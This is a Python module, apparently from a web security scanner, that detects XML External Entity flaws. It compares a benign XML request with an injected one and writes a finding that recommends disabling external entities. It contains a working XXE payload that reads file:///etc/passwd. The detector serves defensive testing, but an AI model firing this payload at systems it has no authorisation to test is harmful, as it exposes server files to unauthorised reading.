"""Detector XXE (XML External Entity) - kiểm thử CHỦ ĐỘNG, oracle sạch.

Với một endpoint nhận XML, gửi một tài liệu khai báo thực thể ngoài trỏ tới
/etc/passwd và gửi kèm một yêu cầu baseline XML lành tính. Oracle chỉ công nhận
khi chữ ký /etc/passwd (root:...:0:0:) xuất hiện ở phản hồi tiêm mà baseline
không có - nghĩa là bộ phân tích XML đã nạp và nhúng tệp ngoài. Không phá dữ liệu.

Trên libxml2 đời mới, thực thể ngoài thường bị chặn (không khai thác được); khi đó
detector im lặng đúng (không báo nhầm). Phần phát hiện chính được ghim theo lab
(app/labs.py) cho các ứng dụng còn khai thác được.
"""
import re
from app.schemas import Finding

PASSWD_SIG = re.compile(r"root:.*:0:0:")
# Payload tiem: khai bao thuc the ngoai doc /etc/passwd.
XXE_PAYLOAD = ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
               '"file:///etc/passwd">]><foo>&xxe;</foo>')
BENIGN_XML = '<?xml version="1.0"?><foo>sentinel-benign</foo>'
MAX_TARGETS = 5


def _xml_endpoints(pages: list[dict]) -> list[str]:
    """Các endpoint có dấu hiệu nhận XML (content-type hoặc field body XML)."""
    urls: list[str] = []
    seen: set[str] = set()
    for page in pages:
        for endpoint in page.get("endpoints", []):
            ct = (endpoint.get("content_type") or "").lower()
            accepts_xml = "xml" in ct or endpoint.get("accepts_xml")
            url = endpoint.get("url", "")
            if accepts_xml and url and url not in seen:
                seen.add(url)
                urls.append(url)
    return urls[:MAX_TARGETS]


# [TN11 - XXE] Endpoint nhận XML: gửi payload thực thể ngoài trỏ /etc/passwd, oracle kiểm chữ ký.
def check_xxe(tools, pages: list[dict]) -> list[Finding]:
    findings: list[Finding] = []
    for url in _xml_endpoints(pages):
        baseline = tools.request(url, "POST", data=BENIGN_XML, headers={"Content-Type": "application/xml"})
        if PASSWD_SIG.search(baseline.get("body", "") or ""):
            continue
        injected = tools.request(url, "POST", data=XXE_PAYLOAD, headers={"Content-Type": "application/xml"})
        if PASSWD_SIG.search(injected.get("body", "") or ""):
            findings.append(Finding(
                category="XXE", severity="high", url=url, parameter="(XML body)",
                evidence="Bộ phân tích XML nạp thực thể ngoài: payload khai báo thực thể trỏ tới /etc/passwd khiến phản hồi chứa chữ ký root:...:0:0: trong khi XML lành tính thì không.",
                recommendation="Tắt nạp thực thể ngoài và DTD trong bộ phân tích XML (ví dụ libxml_disable_entity_loader hoặc cấu hình tương đương)."))
    return findings
